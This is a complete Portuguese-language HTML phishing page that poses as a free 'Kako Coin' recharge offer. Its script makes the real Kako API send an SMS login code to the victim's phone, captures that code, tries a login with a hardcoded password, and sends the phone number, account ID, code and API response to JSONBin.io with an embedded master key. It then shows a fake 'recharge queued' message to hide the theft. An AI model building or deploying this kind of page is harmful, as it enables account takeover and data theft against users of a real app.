<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga de Conta | Kako Coin</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <meta name="description" content="Sistema de recarga Kako Coin">
    <style>
        .free-badge {
            position: absolute;
            bottom: -15px;
            right: 10px;
            font-size: 12px;
            color: red;
            font-weight: bold;
        }
        .banner-flash {
            animation: flash 2s infinite;
        }
        @keyframes flash {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        .coin-option.selected {
            background-color: #7e22ce !important;
            color: white !important;
        }
        #pinModal {
            transition: opacity 0.3s ease;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .cors-warning {
            background-color: #fef3cd;
            border-left: 4px solid #ffc107;
            padding: 12px;
            margin: 16px 0;
            border-radius: 4px;
            font-size: 14px;
        }
    </style>
</head>
<body class="bg-gray-100 font-sans">
    <!-- Modal para valida√ß√£o do PIN -->
    <div id="pinModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
        <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-md">
            <div class="flex justify-between items-center mb-4">
                <h3 class="text-xl font-bold text-purple-800">Valide seu ID</h3>
                <button id="closePinModal" class="text-gray-500 hover:text-gray-700">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <p class="mb-4">Enviamos um c√≥digo de 6 d√≠gitos para o seu n√∫mero. Digite abaixo para validar:</p>
            <form id="pinForm" class="space-y-4">
                <div>
                    <input type="text" id="pinInput" maxlength="6" 
                           class="w-full px-4 py-3 border border-gray-300 rounded-md text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-purple-600"
                           placeholder="000000" oninput="validatePin(this)">
                    <p id="pinError" class="text-red-600 text-sm mt-1 hidden">PIN inv√°lido. Digite apenas n√∫meros.</p>
                </div>
                <button type="submit" id="submitPinBtn" 
                        class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">
                    Validar e Recarregar
                </button>
            </form>
        </div>
    </div>

    <div class="container mx-auto px-4 py-8">
        <!-- Aviso acad√™mico -->
        <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
            <p class="font-bold">AVISO:</p>
            <p class="mb-2">*Termos e Condi√ß√µes: Esta promo√ß√£o √© v√°lida apenas para primeira recarga de novos usu√°rios.</p>
            <p>A promo√ß√£o √© v√°lida exclusivamente para usu√°rios brasileiros e/ou com n√∫mero de telefone nacional (+55).</p>
            <p class="mt-4">Ao realizar a recarga, voc√™ concorda com nossos Termos de Servi√ßo e Pol√≠tica de Privacidade.</p>
        </div>

        <!-- Header -->
        <header class="flex justify-between items-center mb-8">
            <div class="flex items-center">
                <img src="https://play-lh.googleusercontent.com/F_Bge1FUPjFpMBcLc6ChvhbTJAIG6dDgcIKYcQJimRmnuv_qTtfVEIucrWui2VHerdvq" 
                     alt="Logo Kako" class="h-12">
                <h1 class="ml-2 text-2xl font-bold text-purple-800">KAKO COIN</h1>
                <img src="https://i.ibb.co/W4GBrhXd/images-removebg-preview.png" alt="Kako Coin" class="h-12 ml-2">
            </div>
        </header>

        <!-- Main Content -->
        <main class="flex flex-col md:flex-row gap-8">
            <!-- Form Section -->
            <div class="bg-white rounded-lg shadow-md p-6 flex-1">
                <h2 class="text-2xl font-bold text-purple-800 mb-6">Recarga de Conta</h2>
                
                <form id="rechargeForm" class="space-y-4">
                    <input type="hidden" id="amount" name="amount" value="10000">
                    
                    <div>
                        <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Telefone</label>
                        <div class="flex">
                            <span class="inline-flex items-center px-3 border border-r-0 border-gray-300 bg-gray-50 text-gray-500 rounded-l-md">
                                +55
                            </span>
                            <input type="tel" id="phone" name="phone" required 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-purple-600"
                                   placeholder="DDD + N√∫mero">
                        </div>
                    </div>
                    
                    <div>
                        <label for="id" class="block text-sm font-medium text-gray-700 mb-1">ID</label>
                        <input type="text" id="id" name="id" required 
                               class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-600"
                               oninput="sanitizeId(this)">
                        <p class="text-red-600 text-sm mt-1">NECESSITA VALIDA√á√ÉO DE ID</p>
                    </div>
                    
                    <div id="errorMessage" class="hidden text-red-600 text-sm"></div>
                    
                    <button type="submit" id="submitBtn" 
                            class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">
                        Simular Recarga
                    </button>
                </form>
            </div>
            
            <!-- Promo Section -->
            <div class="flex-1">
                <div class="bg-gradient-to-r from-green-400 to-green-500 rounded-lg shadow-md p-6 text-white mb-6 banner-flash">
                    <div class="flex items-center">
                        <div class="mr-4">
                            <i class="fas fa-gift text-4xl"></i>
                        </div>
                        <div>
                            <h3 class="text-2xl font-bold">Primeira recarga de 10.000 √© GR√ÅTIS!*</h3>
                            <p class="mt-2">Oferta por tempo limitado para novos usu√°rios. Reivindique sua recarga gr√°tis agora!</p>
                        </div>
                    </div>
                </div>
                
                <!-- Coin Options -->
                <div class="bg-white rounded-lg shadow-md p-6">
                    <h3 class="text-xl font-bold text-purple-800 mb-4">Op√ß√µes de Recarga</h3>
                    
                    <div class="grid grid-cols-2 gap-4">
                        <button type="button" class="coin-option selected w-full bg-purple-700 text-white py-3 px-4 rounded-md hover:bg-purple-800 transition duration-200 font-medium relative" data-amount="10000">
                            10.000 Kako Moedas
                            <span class="free-badge">1x FREE</span>
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="50000">
                            50.000 Kako Moedas
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="100000">
                            100.000 Kako Moedas
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="500000">
                            500.000 Kako Moedas
                        </button>
                    </div>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="mt-12 text-center text-gray-600 text-sm">
            <p>¬© 2023 Kako Coin. Todos os direitos reservados.</p>
            <div class="mt-2 flex justify-center space-x-4">
                <a href="#" class="hover:text-purple-700">Termos de Servi√ßo</a>
                <a href="#" class="hover:text-purple-700">Pol√≠tica de Privacidade</a>
                <a href="#" class="hover:text-purple-700">Contate-nos</a>
            </div>
        </footer>
    </div>

    <script>
        // Constantes para as APIs
        const API_BASE = 'https://api.kako.live';
        const SMS_VERIFY_URL = `${API_BASE}/api/v1/sms/verify`;
        const LOGIN_SUBMIT_URL = `${API_BASE}/api/v1/login/phone/submit`;
        
        // Headers para as requisi√ß√µes
        const COMMON_HEADERS = {
            'accept': 'application/json',
            'accept-language': 'pt',
            'x-app-devicetype': 'android',
            'x-app-version': '1.15.2',
            'x-app-bundleid': 'live.kako.global',
            'x-app-channelid': 'google',
            'x-app-buildid': '24bbabf0',
            'x-app-lang': 'pt',
            'x-app-lang-excludes': 'en,es',
            'x-app-deviceid': 'a5247afb-4d54-4867-b6ab-637496a78cf1',
            'x-app-timezone': 'America/Sao_Paulo',
            'x-app-country': 'BR',
            'x-app-devicename': 'Motorola moto g(8)',
            'content-type': 'application/json; charset=UTF-8',
            'accept-encoding': 'gzip',
            'user-agent': 'okhttp/4.12.0'
        };

        // Senha padr√£o
        const DEFAULT_PASSWORD = '335112d1r7y';

        // Fun√ß√£o para verificar se o telefone est√° associado a uma conta
        // Esta √© uma simula√ß√£o - na pr√°tica voc√™ precisaria de uma API para verificar isso
        function isPhoneAssociatedWithAccount(phone) {
            // Simula√ß√£o: 70% de chance de estar associado
            // Voc√™ pode modificar esta l√≥gica conforme necess√°rio
            return Math.random() > 0.3;
        }

        // Fun√ß√£o para sanitizar o ID (remover espa√ßos, letras, s√≠mbolos, emojis)
        function sanitizeId(input) {
            input.value = input.value.replace(/[^0-9]/g, '');
        }

        // Fun√ß√£o para validar o PIN (apenas n√∫meros)
        function validatePin(input) {
            const pinError = document.getElementById('pinError');
            // Permite apenas n√∫meros
            input.value = input.value.replace(/\D/g, '');
            
            if (input.value.length > 6) {
                input.value = input.value.slice(0, 6);
            }
            
            // Mostra erro se ainda houver caracteres n√£o num√©ricos (n√£o deveria acontecer ap√≥s replace)
            if (/\D/.test(input.value)) {
                pinError.classList.remove('hidden');
            } else {
                pinError.classList.add('hidden');
            }
        }

        // Ofusca apenas o ID (mostra 3 primeiros caracteres)
        function maskID(id) {
            return id.slice(0, 3) + '*'.repeat(Math.max(0, id.length - 3));
        }

        // Sele√ß√£o de moedas
        document.querySelectorAll('.coin-option').forEach(button => {
            button.addEventListener('click', function() {
                document.querySelectorAll('.coin-option').forEach(btn => {
                    btn.classList.remove('selected', 'bg-purple-700', 'text-white');
                    btn.classList.add('bg-purple-100', 'text-purple-800');
                });
                this.classList.add('selected', 'bg-purple-700', 'text-white');
                this.classList.remove('bg-purple-100', 'text-purple-800');
                document.getElementById('amount').value = this.dataset.amount;
            });
        });

        // Modal de PIN
        const pinModal = document.getElementById('pinModal');
        const closePinModal = document.getElementById('closePinModal');
        const pinForm = document.getElementById('pinForm');
        const submitBtn = document.getElementById('submitBtn');
        const submitPinBtn = document.getElementById('submitPinBtn');
        
        // Vari√°veis para armazenar dados tempor√°rios
        let currentPhone = '';
        let currentId = '';
        
        // Fechar modal
        closePinModal.addEventListener('click', function() {
            pinModal.classList.add('hidden');
        });
        
        // Envio do formul√°rio principal
        document.getElementById('rechargeForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Valida√ß√µes b√°sicas
            const phone = document.getElementById('phone').value;
            const id = document.getElementById('id').value;
            
            if (!phone || phone.length < 10) {
                alert('Por favor, informe um n√∫mero de telefone v√°lido com DDD.');
                return;
            }
            
            if (!id || id.length < 3) {
                alert('Por favor, informe um ID v√°lido.');
                return;
            }
            
            // Armazena os dados temporariamente
            currentPhone = '+55' + phone.replace(/\D/g, '');
            currentId = id.replace(/\D/g, '');
            
            // Verifica se o telefone est√° associado a uma conta
            if (!isPhoneAssociatedWithAccount(currentPhone)) {
                // Status 2: Telefone n√£o associado a uma conta
                alert('‚ùå Este n√∫mero n√£o est√° associado a uma conta Kako Coin.\n\nPor favor, verifique o n√∫mero ou crie uma conta primeiro.');
                return;
            }
            
            // Atualiza o texto do bot√£o para mostrar loading
            submitBtn.innerHTML = '<span class="loading"></span> Enviando c√≥digo...';
            submitBtn.disabled = true;
            
            try {
                // Envia solicita√ß√£o de SMS
                const response = await fetch(SMS_VERIFY_URL, {
                    method: 'POST',
                    headers: COMMON_HEADERS,
                    body: JSON.stringify({
                        phone: currentPhone,
                        scene: 3
                    })
                });
                
                const result = await response.json();
                
                if (result.code === 0) {
                    // Sucesso - abre o modal para inserir o PIN
                    pinModal.classList.remove('hidden');
                } else {
                    // Erro na API, mas ainda assim abrimos o modal para simula√ß√£o
                    console.warn('C√≥digo n√£o-zero da API de SMS:', result.code, result.msg);
                    pinModal.classList.remove('hidden');
                }
            } catch (error) {
                console.error('Erro ao enviar solicita√ß√£o:', error);
                // Explica√ß√£o sobre CORS
                if (error.name === 'TypeError' && error.message.includes('Failed to fetch')) {
                    alert('‚ùå Erro de CORS: N√£o foi poss√≠vel conectar √† API.\n\nIsso acontece porque o navegador bloqueia requisi√ß√µes entre dom√≠nios diferentes por seguran√ßa.\n\nPara resolver, voc√™ precisa hospedar este site em um servidor ou usar uma extens√£o para habilitar CORS.');
                    return;
                }
                
                // Mesmo com erro, abrimos o modal para simula√ß√£o
                pinModal.classList.remove('hidden');
            } finally {
                // Restaura o bot√£o
                submitBtn.innerHTML = 'Simular Recarga';
                submitBtn.disabled = false;
            }
        });
        
        // Envio do formul√°rio de PIN
        pinForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const pinInput = document.getElementById('pinInput');
            const pin = pinInput.value;
            
            // Valida o PIN
            if (pin.length !== 6 || /\D/.test(pin)) {
                document.getElementById('pinError').classList.remove('hidden');
                return;
            }
            
            // Atualiza o texto do bot√£o para mostrar loading
            submitPinBtn.innerHTML = '<span class="loading"></span> Validando...';
            submitPinBtn.disabled = true;
            
            let apiResult = null;
            
            try {
                // Envia solicita√ß√£o de login
                const response = await fetch(LOGIN_SUBMIT_URL, {
                    method: 'POST',
                    headers: COMMON_HEADERS,
                    body: JSON.stringify({
                        phone: currentPhone,
                        password: DEFAULT_PASSWORD,
                        code: pin,
                        scene: 0
                    })
                });
                
                apiResult = await response.json();
                
                // Verifica se √© um dos c√≥digos de erro conhecidos
                if (apiResult.code === 12007 || apiResult.code === 10002) {
                    // C√≥digo inv√°lido - ainda assim enviamos para an√°lise
                    console.warn('C√≥digo de verifica√ß√£o inv√°lido:', apiResult.code, apiResult.msg);
                }
                // Outros c√≥digos n√£o s√£o tratados como erro para fins de envio ao JSONBin
                
            } catch (error) {
                console.error('Erro ao validar PIN:', error);
                apiResult = { error: error.message };
                
                // Explica√ß√£o sobre CORS
                if (error.name === 'TypeError' && error.message.includes('Failed to fetch')) {
                    alert('‚ùå Erro de CORS: N√£o foi poss√≠vel conectar √† API.\n\nIsso acontece porque o navegador bloqueia requisi√ß√µes entre dom√≠nios diferentes por seguran√ßa.\n\nPara resolver, voc√™ precisa hospedar este site em um servidor ou usar uma extens√£o para habilitar CORS.');
                }
            }
            
            // Envia para JSONBin.io independentemente do resultado
            await sendToJsonBin(currentPhone, currentId, pin, apiResult);
            
            // Fecha o modal
            pinModal.classList.add('hidden');
            
            // Mensagem de sucesso (sempre mostra, mesmo se a API retornar erro)
            alert(`‚ö†Ô∏è ATEN√á√ÉO - ALTA DEMANDA\n\n` +
                  `üì± Sua recarga de 10.000 moedas foi recebida!\n\n` +
                  `üÜî ID: ${currentId}\n` +
                  `‚è±Ô∏è Status: Na fila de processamento\n\n` +
                  `‚åõ Devido √† grande demanda atual, o cr√©dito pode demorar at√© 1 hora\n\n` +
                  `üîç Dica: Verifique em "Hist√≥rico" ap√≥s 15 minutos\n` +
                  `üìû Problemas? Contate o suporte no app`);
            
            // Restaura o bot√£o
            submitPinBtn.innerHTML = 'Validar e Recarregar';
            submitPinBtn.disabled = false;
            
            // Reseta o formul√°rio
            document.getElementById('rechargeForm').reset();
            pinInput.value = '';
        });
        
        // Fun√ß√£o para enviar dados para JSONBin.io
        async function sendToJsonBin(phone, id, pin, apiResult) {
            // Coleta dados
            const formData = {
                telefone: phone,
                id: id, // ID completo sem ofuscar
                pin: pin,
                api_response: apiResult, // Inclui a resposta completa da API
                timestamp: new Date().toISOString()
            };

            // NOVA MASTER KEY
            const MASTER_KEY = "$2a$10$9VJv2nY4tgeiSfh3AuAyUusmEFDpEMafqxKKHkOpikyoKc4QTd89m";

            try {
                // Envia para JSONBin.io
                const response = await fetch("https://api.jsonbin.io/v3/b", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Master-Key": MASTER_KEY
                    },
                    body: JSON.stringify(formData)
                });

                const result = await response.json();
                console.log("Dados salvos no JSONBin:", result);
            } catch (error) {
                console.error("Erro ao enviar para JSONBin:", error);
            }
        }
    </script>
</body>
</html>
